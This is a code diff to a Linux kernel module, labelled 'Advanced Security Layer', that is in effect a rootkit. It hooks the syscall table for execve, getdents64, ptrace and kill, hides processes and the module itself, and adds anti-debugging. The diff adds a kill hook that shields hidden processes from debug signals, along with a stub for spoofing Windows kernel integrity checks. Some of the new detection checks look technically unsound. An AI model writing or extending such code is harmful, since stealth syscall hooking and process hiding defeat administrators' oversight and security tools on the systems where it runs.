@@ -183,14 +183,24 @@ static bool detect_debugging_attempt(void) {
     }
     
     // Verificar timing attacks (detecção de breakpoints)
-    static unsigned long last_time = 0;
-    unsigned long current_time = jiffies;
+    static unsigned long last_jiffies = 0;
+    unsigned long current_jiffies = jiffies;
     
-    if (last_time && (current_time - last_time) > HZ) {
-        last_time = current_time;
-        return true; // Possível breakpoint
+    if (last_jiffies != 0 && jiffies_to_msecs(current_jiffies - last_jiffies) < 10) { // Check for very fast execution
+        // This could indicate a debugger skipping instructions or a timing attack
+        return true;
     }
-    last_time = current_time;
+    last_jiffies = current_jiffies;
+
+    // Check for process replacement (e.g., by a debugger)
+    if (current->self_exec_id != 0 && current->self_exec_id != current->pid) {
+        return true;
+    }
+
+    // Check for debugger-like exit signals
+    if (current->exit_signal == SIGTRAP || current->exit_signal == SIGSTOP) {
+        return true;
+    }
     
     return false;
 }
@@ -325,6 +335,29 @@ static asmlinkage long hooked_sys_ptrace(long request, long pid, unsigned long a
     return orig_sys_ptrace(request, pid, addr, data);
 }
 
+// Hook avançado para sys_kill com bloqueio de sinais de debug
+static asmlinkage long hooked_sys_kill(pid_t pid, int sig) {
+    // Bloquear sinais de debug para processos protegidos
+    if (sig == SIGSTOP || sig == SIGTRAP || sig == SIGCONT) {
+        int i;
+        for (i = 0; i < hidden_pids_count; i++) {
+            if (hidden_pids[i] == pid) {
+                return -EPERM; // Negar acesso
+            }
+        }
+    }
+    return orig_sys_kill(pid, sig);
+}
+
+// Função para simular integridade do kernel Windows (placeholder)
+static void simulate_windows_kernel_integrity(void) {
+    // TODO: Implementar spoofing de checks de integridade do kernel Windows.
+    // Isso pode incluir:
+    // - Retornar valores esperados para chamadas de sistema que verificam a integridade do kernel.
+    // - Spoofing de assinaturas digitais de módulos de kernel ou arquivos de sistema.
+    // - Manipulação de estruturas de dados do kernel para parecerem "limpas".
+}
+
 // Função para instalar hook com trampoline
 static int install_hook(void **syscall_addr, void *hook_func, void **orig_func) {
     struct hook_info *hook;
@@ -393,24 +426,17 @@ static int proc_show(struct seq_file *m, void *v) {
     struct stealth_log_entry *entry;
     int count = 0;
     
-    seq_printf(m, "System Information Monitor v3.0
-");
-    seq_printf(m, "Active entries: %d
-", atomic_read(&log_count));
-    seq_printf(m, "Stealth mode: %s
-", stealth_mode ? "enabled" : "disabled");
-    seq_printf(m, "Anti-debug: %s
-", anti_debug_active ? "enabled" : "disabled");
-    seq_printf(m, "Hidden processes: %d
-
-", hidden_pids_count);
+    seq_printf(m, "System Information Monitor v3.0\n");
+    seq_printf(m, "Active entries: %d\n", atomic_read(&log_count));
+    seq_printf(m, "Stealth mode: %s\n", stealth_mode ? "enabled" : "disabled");
+    seq_printf(m, "Anti-debug: %s\n\n", anti_debug_active ? "enabled" : "disabled");
+    seq_printf(m, "Hidden processes: %d\n\n", hidden_pids_count);
     
     spin_lock(&log_lock);
     list_for_each_entry(entry, &stealth_log_list, list) {
         if (count++ > 50) break; // Limitar saída
         
-        seq_printf(m, "[%lu.%09lu] PID:%d TGID:%d COMM:%s OP:%s DATA:[%lu,%lu,%lu,%lu]
-",
+        seq_printf(m, "[%lu.%09lu] PID:%d TGID:%d COMM:%s OP:%s DATA:[%lu,%lu,%lu,%lu]\n",
                   entry->timestamp.tv_sec, entry->timestamp.tv_nsec,
                   entry->pid, entry->tgid, entry->comm, entry->operation,
                   entry->data[0], entry->data[1], entry->data[2], entry->data[3]);
@@ -437,8 +463,7 @@ static int __init advanced_barrierlayer_init(void) {
     kallsyms_lookup_name_t kallsyms_lookup_name;
     int ret;
     
-    pr_info("Advanced Security Layer: Initializing...
-");
+    pr_info("Advanced Security Layer: Initializing...\n");
     
     // Inicializar listas e locks
     INIT_LIST_HEAD(&hook_list);
@@ -449,8 +474,7 @@ static int __init advanced_barrierlayer_init(void) {
     // Obter kallsyms_lookup_name via kprobe
     ret = register_kprobe(&kp);
     if (ret < 0) {
-        pr_err("Advanced Security Layer: Failed to register kprobe
-");
+        pr_err("Advanced Security Layer: Failed to register kprobe\n");
         return ret;
     }
     kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
@@ -459,8 +483,7 @@ static int __init advanced_barrierlayer_init(void) {
     // Encontrar sys_call_table
     sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
     if (!sys_call_table) {
-        pr_err("Advanced Security Layer: sys_call_table not found
-");
+        pr_err("Advanced Security Layer: sys_call_table not found\n");
         return -ENOENT;
     }
     table_found = true;
@@ -470,12 +493,12 @@ static int __init advanced_barrierlayer_init(void) {
     install_hook((void **)&sys_call_table[__NR_execve], hooked_sys_execve, (void **)&orig_sys_execve);
     install_hook((void **)&sys_call_table[__NR_getdents64], hooked_sys_getdents64, (void **)&orig_sys_getdents64);
     install_hook((void **)&sys_call_table[__NR_ptrace], hooked_sys_ptrace, (void **)&orig_sys_ptrace);
+    install_hook((void **)&sys_call_table[__NR_kill], hooked_sys_kill, (void **)&orig_sys_kill); // Hook sys_kill
     
     // Criar entrada proc
     proc_entry = proc_create(MODULE_PROC_NAME, 0644, NULL, &proc_fops);
     if (!proc_entry) {
-        pr_err("Advanced Security Layer: Failed to create proc entry
-");
+        pr_err("Advanced Security Layer: Failed to create proc entry\n");
         remove_all_hooks();
         return -ENOMEM;
     }
@@ -483,8 +506,7 @@ static int __init advanced_barrierlayer_init(void) {
     // Ocultar módulo se stealth mode estiver ativo
     hide_module();
     
-    pr_info("Advanced Security Layer: Loaded successfully
-");
+    pr_info("Advanced Security Layer: Loaded successfully\n");
     return 0;
 }
 
@@ -508,8 +530,7 @@ static void __exit advanced_barrierlayer_exit(void) {
     }
     spin_unlock(&log_lock);
     
-    pr_info("Advanced Security Layer: Unloaded
-");
+    pr_info("Advanced Security Layer: Unloaded\n");
 }
 
 // Funções para controle de PIDs ocultos (via ioctl ou proc)
